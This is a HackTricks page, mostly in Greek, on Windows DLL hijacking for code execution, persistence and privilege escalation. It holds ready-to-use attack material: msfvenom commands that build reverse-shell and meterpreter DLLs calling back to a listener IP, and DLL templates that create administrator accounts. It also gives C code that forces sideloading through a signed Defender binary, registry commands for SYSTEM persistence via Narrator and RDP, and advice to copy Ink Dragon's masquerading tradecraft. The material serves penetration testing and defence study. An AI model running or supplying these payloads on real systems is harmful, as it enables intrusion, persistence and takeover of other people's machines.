# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Βασικές Πληροφορίες

DLL Hijacking περιλαμβάνει την παραποίηση μιας αξιόπιστης εφαρμογής ώστε να φορτώσει ένα κακόβουλο DLL. Ο όρος αυτός περιλαμβάνει πολλές τακτικές όπως **DLL Spoofing, Injection, and Side-Loading**. Χρησιμοποιείται κυρίως για code execution, επίτευξη persistence και, λιγότερο συνήθως, privilege escalation. Παρά την έμφαση στην escalation εδώ, η μέθοδος του hijacking παραμένει ίδια ανεξαρτήτως του στόχου.

### Συνήθεις Τεχνικές

Χρησιμοποιούνται αρκετές μέθοδοι για DLL hijacking, η κάθε μία με την αποτελεσματικότητά της ανάλογα με τη στρατηγική φόρτωσης DLL της εφαρμογής:

1. **DLL Replacement**: Αντικατάσταση ενός γνήσιου DLL με ένα κακόβουλο, προαιρετικά χρησιμοποιώντας DLL Proxying για να διατηρηθεί η λειτουργικότητα του αρχικού DLL.
2. **DLL Search Order Hijacking**: Τοποθέτηση του κακόβουλου DLL σε ένα search path πριν από το νόμιμο, εκμεταλλευόμενοι το search pattern της εφαρμογής.
3. **Phantom DLL Hijacking**: Δημιουργία ενός κακόβουλου DLL που η εφαρμογή θα προσπαθήσει να φορτώσει, νομίζοντας ότι πρόκειται για ένα απαιτούμενο DLL που δεν υπάρχει.
4. **DLL Redirection**: Τροποποίηση παραμέτρων αναζήτησης όπως %PATH% ή αρχεία .exe.manifest / .exe.local για να κατευθυνθεί η εφαρμογή στο κακόβουλο DLL.
5. **WinSxS DLL Replacement**: Αντικατάσταση του γνήσιου DLL με ένα κακόβουλο αντίστοιχο στον κατάλογο WinSxS, μέθοδος που συχνά συνδέεται με DLL side-loading.
6. **Relative Path DLL Hijacking**: Τοποθέτηση του κακόβουλου DLL σε έναν φάκελο ελεγχόμενο από τον χρήστη μαζί με την αντιγραμμένη εφαρμογή, που μοιάζει με τεχνικές Binary Proxy Execution.

> [!TIP]
> Για μια βήμα-προς-βήμα αλυσίδα που στρωματώνει HTML staging, AES-CTR configs και .NET implants πάνω από DLL sideloading, δείτε το workflow παρακάτω.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Εύρεση ελλειπόντων Dlls

Ο πιο κοινός τρόπος να βρείτε missing Dlls μέσα σε ένα σύστημα είναι να τρέξετε [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) από sysinternals, **ρυθμίζοντας** τα **εξής 2 φίλτρα**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

και να εμφανίσετε μόνο τη **Δραστηριότητα Συστήματος Αρχείων**:

![](<../../../images/image (153).png>)

Αν ψάχνετε για **missing dlls in general** αφήνετε αυτό να τρέξει για μερικά **seconds**.\
Αν ψάχνετε για ένα **missing dll μέσα σε ένα συγκεκριμένο executable** θα πρέπει να ορίσετε **άλλο φίλτρο όπως "Process Name" "contains" `<exec name>`, να το εκτελέσετε και να σταματήσετε την καταγραφή events**.

## Εκμετάλλευση Ελλειπόντων Dlls

Για να κάνουμε escalate privileges, η καλύτερη ευκαιρία που έχουμε είναι να μπορούμε να **γράψουμε ένα dll που μια privileged διεργασία θα προσπαθήσει να φορτώσει** σε κάποιο από τα **σκυλάκια όπου πρόκειται να αναζητηθεί**. Επομένως, θα μπορέσουμε να **γράψουμε** ένα dll σε έναν **φάκελο** όπου το **dll αναζητείται πριν** από τον φάκελο όπου βρίσκεται το **αρχικό dll** (παράξενο σενάριο), ή θα μπορέσουμε να **γράψουμε σε κάποιο φάκελο όπου θα αναζητηθεί το dll** και το αρχικό **dll δεν υπάρχει** σε κανέναν φάκελο.

### Dll Search Order

**Μέσα στην** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **μπορείτε να βρείτε πώς φορτώνονται συγκεκριμένα οι Dlls.**

Οι Windows εφαρμογές αναζητούν DLLs ακολουθώντας ένα σύνολο προ-ορισμένων search paths, τηρώντας μια συγκεκριμένη ακολουθία. Το πρόβλημα του DLL hijacking προκύπτει όταν ένα κακόβουλο DLL τοποθετείται στρατηγικά σε έναν από αυτούς τους καταλόγους, εξασφαλίζοντας ότι φορτώνεται πριν από το αυθεντικό DLL. Μια λύση για να το αποτρέψετε είναι να βεβαιωθείτε ότι η εφαρμογή χρησιμοποιεί absolute paths όταν αναφέρεται στα DLLs που χρειάζεται.

Μπορείτε να δείτε την DLL search order σε 32-bit συστήματα παρακάτω:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Αυτή είναι η **default** σειρά αναζήτησης με το **SafeDllSearchMode** ενεργοποιημένο. Όταν είναι απενεργοποιημένο, ο current directory ανεβαίνει στη δεύτερη θέση. Για να απενεργοποιήσετε αυτή τη λειτουργία, δημιουργήστε την τιμή μητρώου **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** και ορίστε την σε 0 (η προεπιλογή είναι enabled).

Εάν η συνάρτηση [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) κληθεί με **LOAD_WITH_ALTERED_SEARCH_PATH** η αναζήτηση ξεκινάει από τον κατάλογο του executable module που φορτώνει η **LoadLibraryEx**.

Τέλος, σημειώστε ότι **ένα dll μπορεί να φορτωθεί δηλώνοντας το absolute path αντί απλώς το όνομα**. Στην περίπτωση αυτή το dll **θα αναζητηθεί μόνο σε εκείνο το path** (εάν το dll έχει εξαρτήσεις, αυτές θα αναζητηθούν όπως αν είχαν φορτωθεί απλώς με το όνομά τους).

Υπάρχουν και άλλοι τρόποι να αλλάξετε την search order αλλά δεν θα τους εξηγήσω εδώ.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

An advanced way to deterministically influence the DLL search path of a newly created process is to set the DllPath field in RTL_USER_PROCESS_PARAMETERS when creating the process with ntdll’s native APIs. By supplying an attacker-controlled directory here, a target process that resolves an imported DLL by name (no absolute path and not using the safe loading flags) can be forced to load a malicious DLL from that directory.

Κύρια ιδέα
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Σημειώσεις/περιορισμοί
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Πλήρες παράδειγμα C: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Παράδειγμα λειτουργικής χρήσης
- Τοποθετήστε ένα κακόβουλο xmllite.dll (exporting the required functions or proxying to the real one) στον κατάλογο DllPath σας.
- Εκκινήστε ένα signed binary γνωστό ότι αναζητά το xmllite.dll κατά όνομα χρησιμοποιώντας την παραπάνω τεχνική. Ο loader επιλύει την εισαγωγή μέσω του παρεχόμενου DllPath και sideloads το DLL σας.

Αυτή η τεχνική έχει παρατηρηθεί in-the-wild να οδηγεί multi-stage sideloading chains: ένας αρχικός launcher drops ένα helper DLL, το οποίο στη συνέχεια spawns ένα Microsoft-signed, hijackable binary με custom DllPath για να αναγκάσει το φόρτωμα του attacker’s DLL από έναν staging directory.


#### Εξαιρέσεις στην σειρά αναζήτησης DLL από Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Απαιτήσεις**:

- Εντοπίστε μια διεργασία που λειτουργεί ή θα λειτουργήσει υπό **different privileges** (horizontal or lateral movement), η οποία είναι **lacking a DLL**.
- Βεβαιωθείτε ότι υπάρχει **write access** διαθέσιμο για οποιονδήποτε **directory** στο οποίο η **DLL** θα **searched for**. Αυτή η τοποθεσία μπορεί να είναι ο κατάλογος του εκτελέσιμου ή ένας κατάλογος μέσα στο system path.

Ναι, τα απαιτούμενα είναι δύσκολα να βρεθούν καθώς **by default it's kind of weird to find a privileged executable missing a dll** και είναι ακόμα **more weird to have write permissions on a system path folder** (you can't by default). But, in misconfigured environments this is possible.\
Σε περίπτωση που είστε τυχεροί και πληροίτε τις προϋποθέσεις, μπορείτε να δείτε το project [UACME](https://github.com/hfiref0x/UACME). Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).

Σημειώστε ότι μπορείτε να **ελέγξετε τα δικαιώματά σας σε έναν φάκελο** κάνοντας:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Και **ελέγξτε τα δικαιώματα όλων των φακέλων μέσα στο PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Μπορείτε επίσης να ελέγξετε τα imports ενός executable και τα exports ενός dll με:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Για έναν πλήρη οδηγό για το πώς να **εκμεταλλευτείτε το Dll Hijacking για να αναβαθμίσετε τα προνόμια** με δικαιώματα εγγραφής σε ένα **System Path folder** δείτε:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)θα ελέγξει αν έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στο system PATH.\
Άλλα ενδιαφέροντα αυτοματοποιημένα εργαλεία για να ανακαλύψετε αυτήν την ευπάθεια είναι οι **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ και _Write-HijackDll._

### Example

Σε περίπτωση που βρείτε ένα εκμεταλλεύσιμο σενάριο, ένα από τα πιο σημαντικά πράγματα για να το εκμεταλλευτείτε επιτυχώς είναι να **δημιουργήσετε ένα dll που εξάγει τουλάχιστον όλες τις συναρτήσεις που το εκτελέσιμο θα εισάγει από αυτό**. Πάντως, σημειώστε ότι το Dll Hijacking είναι χρήσιμο για να [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ή από[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Μπορείτε να βρείτε ένα παράδειγμα του **πώς να δημιουργήσετε ένα έγκυρο dll** σε αυτή τη μελέτη για dll hijacking με έμφαση στην εκτέλεση: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Επιπλέον, στην **επόμενη ενότητα** μπορείτε να βρείτε μερικούς **βασικούς κώδικες dll** που μπορεί να είναι χρήσιμοι ως **πρότυπα** ή για να δημιουργήσετε ένα **dll που εξάγει μη απαραίτητες συναρτήσεις**.

## **Δημιουργία και μεταγλώττιση Dlls**

### **Dll Proxifying**

Βασικά, ένας **Dll proxy** είναι ένα Dll ικανό να **εκτελέσει τον κακόβουλο κώδικά σας όταν φορτωθεί** αλλά επίσης να **εκθέσει** και να **λειτουργήσει όπως αναμένεται** μεταβιβάζοντας όλες τις κλήσεις στην πραγματική βιβλιοθήκη.

Με το εργαλείο [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή [**Spartacus**](https://github.com/Accenture/Spartacus) μπορείτε ουσιαστικά να **υποδείξετε ένα εκτελέσιμο και να επιλέξετε τη βιβλιοθήκη** που θέλετε να proxify και να **παράγετε ένα proxified dll** ή να **υποδείξετε το Dll** και να **παράγετε ένα proxified dll**.

### **Meterpreter**

**Πάρτε rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Αποκτήστε ένα meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Δημιούργησε έναν χρήστη (x86 δεν είδα έκδοση x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Το δικό σας

Σημειώστε ότι σε αρκετές περιπτώσεις η Dll που θα μεταγλωττίσετε πρέπει να **export several functions** που πρόκειται να φορτωθούν από τη victim process. Αν αυτές οι functions δεν υπάρχουν, το **binary won't be able to load** αυτές και το **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Παράδειγμα C++ DLL με δημιουργία χρήστη</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Εναλλακτική C DLL με είσοδο νήματος</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Μελέτη περίπτωσης: Narrator OneCore TTS Localization DLL Hijack (Προσβασιμότητα/ATs)

Το Narrator.exe των Windows εξακολουθεί να ελέγχει μια προβλέψιμη, γλωσσικά-ειδική βιβλιοθήκη DLL τοπικοποίησης κατά την εκκίνηση, η οποία μπορεί να υποκλαπεί για εκτέλεση αυθαίρετου κώδικα και διατήρηση πρόσβασης.

Κύρια σημεία
- Διαδρομή που ελέγχεται (τρέχουσες εκδόσεις): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Παλιότερη διαδρομή (παλαιότερες εκδόσεις): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Εάν υπάρχει εγγράψιμο DLL ελεγχόμενο από επιτιθέμενο στη διαδρομή OneCore, αυτό φορτώνεται και εκτελείται `DllMain(DLL_PROCESS_ATTACH)`. Δεν απαιτούνται εξαγωγές.

Ανακάλυψη με Procmon
- Φίλτρο: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Εκκινήστε το Narrator και παρατηρήστε την προσπάθεια φόρτωσης της παραπάνω διαδρομής.

Ελάχιστο DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Μια αφελής hijack θα μιλήσει/επισημάνει το UI. Για να παραμείνετε σιωπηλοί, κατά το attach απαριθμήστε τα νήματα του Narrator, ανοίξτε το κύριο νήμα (`OpenThread(THREAD_SUSPEND_RESUME)`) και κάντε `SuspendThread` σε αυτό· συνεχίστε στο δικό σας νήμα. Δείτε PoC για πλήρες κώδικα.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Με τα παραπάνω, η εκκίνηση του Narrator φορτώνει το τοποθετημένο DLL. Στην secure desktop (logon screen), πατήστε CTRL+WIN+ENTER για να ξεκινήσετε τον Narrator· το DLL σας εκτελείται ως SYSTEM στην secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Η εκτέλεση σταματά όταν κλείσει η RDP συνεδρία — inject/migrate άμεσα.

Bring Your Own Accessibility (BYOA)
- Μπορείτε να κλωνοποιήσετε μια ενσωματωμένη Accessibility Tool (AT) καταχώρηση μητρώου (π.χ., CursorIndicator), να την επεξεργαστείτε ώστε να δείχνει σε ένα αυθαίρετο binary/DLL, να την εισάγετε, και έπειτα να ορίσετε `configuration` σε εκείνο το AT όνομα. Αυτό παρέχει proxy για αυθαίρετη εκτέλεση υπό το Accessibility framework.

Notes
- Η εγγραφή στο `%windir%\System32` και η αλλαγή τιμών HKLM απαιτεί δικαιώματα διαχειριστή.
- Όλη η λογική του payload μπορεί να βρίσκεται στο `DLL_PROCESS_ATTACH`; δεν χρειάζονται exports.

## Μελέτη Περίπτωσης: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Αυτή η περίπτωση δείχνει το Phantom DLL Hijacking στο Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), καταγεγραμμένο ως **CVE-2025-1729**.

### Λεπτομέρειες Ευπάθειας

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Υλοποίηση Εκμετάλλευσης

Ένας επιτιθέμενος μπορεί να τοποθετήσει ένα κακόβουλο `hostfxr.dll` stub στον ίδιο κατάλογο, εκμεταλλευόμενος το λείπον DLL για να επιτύχει εκτέλεση κώδικα υπό το context του χρήστη:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Ροή επίθεσης

1. Ως τυπικός χρήστης, τοποθετήστε το `hostfxr.dll` στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Περιμένετε να εκτελεστεί η προγραμματισμένη εργασία στις 9:30 π.μ. στο context του τρέχοντος χρήστη.
3. Εάν ένας διαχειριστής είναι συνδεδεμένος όταν εκτελεστεί η εργασία, το κακόβουλο DLL εκτελείται στη συνεδρία του διαχειριστή με medium integrity.
4. Χρησιμοποιήστε συνηθισμένες UAC bypass τεχνικές για ανύψωση από medium integrity σε SYSTEM privileges.

## Μελέτη περίπτωσης: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors συχνά συνδυάζουν MSI-based droppers με DLL side-loading για να εκτελέσουν payloads υπό έναν trusted, signed process.

Chain overview
- Ο χρήστης κατεβάζει το MSI. Μια CustomAction εκτελείται αθόρυβα κατά την GUI εγκατάσταση (π.χ., LaunchApplication ή ενέργεια VBScript), ανακατασκευάζοντας το επόμενο στάδιο από ενσωματωμένους πόρους.
- Ο dropper γράφει ένα νόμιμο, υπογεγραμμένο EXE και ένα κακόβουλο DLL στον ίδιο κατάλογο (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Όταν το signed EXE ξεκινήσει, το Windows DLL search order φορτώνει το wsc.dll από τον τρέχοντα φάκελο πρώτο, εκτελώντας attacker code υπό υπογεγραμμένο parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Αναζητήστε εγγραφές που εκτελούν εκτελέσιμα ή VBScript. Παράδειγμα ύποπτου μοτίβου: LaunchApplication που εκτελεί ενσωματωμένο αρχείο στο παρασκήνιο.
- Στο Orca (Microsoft Orca.exe), ελέγξτε τους πίνακες CustomAction, InstallExecuteSequence και Binary.
- Ενσωματωμένα/διασπασμένα payloads στο MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Αναζητήστε πολλαπλά μικρά τεμάχια που συνενώνονται και αποκρυπτογραφούνται από μια VBScript CustomAction. Συνηθισμένη ροή:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Πρακτικό sideloading με wsc_proxy.exe
- Τοποθετήστε αυτά τα δύο αρχεία στον ίδιο φάκελο:
- wsc_proxy.exe: νόμιμος υπογεγραμμένος host (Avast). Η διεργασία προσπαθεί να φορτώσει το wsc.dll με το όνομα από τον κατάλογό του.
- wsc.dll: DLL του επιτιθέμενου. Αν δεν απαιτούνται συγκεκριμένα exports, το DllMain μπορεί να αρκεί; αλλιώς, δημιουργήστε ένα proxy DLL και προωθήστε τα απαιτούμενα exports στη γνήσια βιβλιοθήκη ενώ εκτελείτε το payload στο DllMain.
- Δημιουργήστε ένα ελάχιστο DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Για απαιτήσεις εξαγωγής, χρησιμοποιήστε ένα proxying framework (π.χ., DLLirant/Spartacus) για να δημιουργήσετε ένα forwarding DLL που επίσης εκτελεί το payload σας.

- Αυτή η τεχνική βασίζεται στην επίλυση ονόματος DLL από το host binary. Αν ο host χρησιμοποιεί απόλυτες διαδρομές ή safe loading flags (π.χ., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), το hijack μπορεί να αποτύχει.
- KnownDLLs, SxS, και forwarded exports μπορούν να επηρεάσουν την προτεραιότητα και πρέπει να ληφθούν υπόψη κατά την επιλογή του host binary και του export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point περιέγραψε πώς το Ink Dragon αναπτύσσει το ShadowPad χρησιμοποιώντας μια **τριάδα τριών αρχείων** για να συγχωνευτεί με νόμιμο λογισμικό ενώ το βασικό payload παραμένει κρυπτογραφημένο στο δίσκο:

1. **Signed host EXE** – vendors such as AMD, Realtek, or NVIDIA are abused (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Οι επιτιθέμενοι μετονομάζουν το εκτελέσιμο ώστε να δείχνει σαν Windows binary (π.χ. `conhost.exe`), αλλά η Authenticode υπογραφή παραμένει έγκυρη.
2. **Malicious loader DLL** – αποτίθεται δίπλα στο EXE με το αναμενόμενο όνομα (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Η DLL είναι συνήθως ένα MFC binary obfuscated με το ScatterBrain framework· ο μόνος της ρόλος είναι να εντοπίσει το κρυπτογραφημένο blob, να το αποκρυπτογραφήσει και να reflectively map το ShadowPad.
3. **Encrypted payload blob** – συχνά αποθηκευμένο ως `<name>.tmp` στον ίδιο φάκελο. Αφού γίνει memory-mapping στο αποκρυπτογραφημένο payload, ο loader διαγράφει το TMP αρχείο για να καταστρέψει forensics αποδεικτικά στοιχεία.

Tradecraft notes:

* Η μετονομασία του signed EXE (ενώ διατηρείται το αρχικό `OriginalFileName` στο PE header) του επιτρέπει να μιμηθεί ένα Windows binary αλλά να κρατήσει την υπογραφή του vendor, οπότε αντιγράψτε την τακτική του Ink Dragon να ρίχνει `conhost.exe`-looking binaries που στην πραγματικότητα είναι AMD/NVIDIA utilities.
* Επειδή το εκτελέσιμο παραμένει trusted, τα περισσότερα allowlisting controls απαιτούν απλώς η malicious DLL να βρίσκεται δίπλα του. Επικεντρωθείτε στην προσαρμογή του loader DLL· ο signed parent συνήθως μπορεί να τρέξει ανέπαφος.
